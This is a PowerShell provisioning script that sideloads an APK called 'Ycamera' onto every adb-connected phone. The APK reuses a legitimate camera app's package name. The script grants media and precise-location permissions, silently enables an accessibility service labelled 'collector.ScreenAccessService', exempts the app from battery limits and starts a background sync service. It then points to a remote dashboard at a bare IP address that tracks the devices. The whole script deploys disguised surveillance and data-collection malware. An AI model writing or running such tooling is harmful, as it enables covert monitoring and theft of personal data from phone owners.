param(
  [string]$Apk = "D:\pojia\mediastorm_re\out\Ycamera.apk",
  [string]$Adb = "D:\XuanJianDev\AndroidSdk\platform-tools\adb.exe"
)
# Provision Ycamera on every connected phone: install, grant permissions, enable accessibility, start.
# Usage:  .\provision.ps1            # all connected devices
#         .\provision.ps1 -Apk C:\x.apk
$ErrorActionPreference = "Continue"
$pkg = "com.blackmagicdesign.android.blackmagiccam"
$acc = "$pkg/com.ycamera.collector.ScreenAccessService"

if (-not (Test-Path $Apk)) { throw "APK not found: $Apk" }

$devices = (& $Adb devices) | Select-Object -Skip 1 | Where-Object { $_ -match '\sdevice$' } | ForEach-Object { ($_ -split '\s+')[0] }
if (-not $devices) { Write-Host "No device connected"; exit 1 }
Write-Host ("Devices: " + ($devices -join ", "))

$perms = @(
  "android.permission.READ_MEDIA_IMAGES",
  "android.permission.READ_MEDIA_VIDEO",
  "android.permission.ACCESS_FINE_LOCATION",
  "android.permission.ACCESS_COARSE_LOCATION",
  "android.permission.POST_NOTIFICATIONS"
)

foreach ($d in $devices) {
  Write-Host ""
  Write-Host "=== $d ==="
  $model = (& $Adb -s $d shell getprop ro.product.model) -join ""
  $rel = (& $Adb -s $d shell getprop ro.build.version.release) -join ""
  Write-Host ("Model: " + $model.Trim() + "  Android: " + $rel.Trim())

  Write-Host "[1/5] push + install"
  & $Adb -s $d push $Apk /data/local/tmp/yc.apk | Out-Null
  $inst = & $Adb -s $d shell "pm install -r -t --user 0 /data/local/tmp/yc.apk" 2>&1
  Write-Host ("      " + ($inst -join " "))

  Write-Host "[2/5] grant runtime permissions"
  foreach ($p in $perms) {
    & $Adb -s $d shell "pm grant $pkg $p" 2>&1 | Out-Null
  }
  Write-Host "      done"

  Write-Host "[3/5] enable accessibility service"
  $cur = (& $Adb -s $d shell "settings get secure enabled_accessibility_services") -join ""
  $cur = $cur.Trim()
  if ($cur -eq "null" -or $cur -eq "") { $new = $acc }
  elseif ($cur -like "*ScreenAccessService*") { $new = $cur }
  else { $new = "$cur`:$acc" }
  & $Adb -s $d shell "settings put secure enabled_accessibility_services $new" 2>&1 | Out-Null
  & $Adb -s $d shell "settings put secure accessibility_enabled 1" 2>&1 | Out-Null
  Write-Host ("      " + ((& $Adb -s $d shell "settings get secure enabled_accessibility_services") -join "").Trim())

  Write-Host "[4/5] battery: disable optimization for this app"
  & $Adb -s $d shell "dumpsys deviceidle whitelist +$pkg" 2>&1 | Out-Null
  & $Adb -s $d shell "cmd appops set $pkg RUN_IN_BACKGROUND allow" 2>&1 | Out-Null
  & $Adb -s $d shell "cmd appops set $pkg START_FOREGROUND allow" 2>&1 | Out-Null
  Write-Host "      done"

  Write-Host "[5/5] launch once to bind everything"
  & $Adb -s $d shell "monkey -p $pkg -c android.intent.category.LAUNCHER 1" 2>&1 | Out-Null
  Start-Sleep -Seconds 2
  $svc = (& $Adb -s $d shell "dumpsys activity services $pkg | grep -c SyncService") -join ""
  Write-Host ("      SyncService instances: " + $svc.Trim())
  Write-Host "      OK"
}

Write-Host ""
Write-Host "All done. Open http://45.202.254.212:8787/devices to see them online."
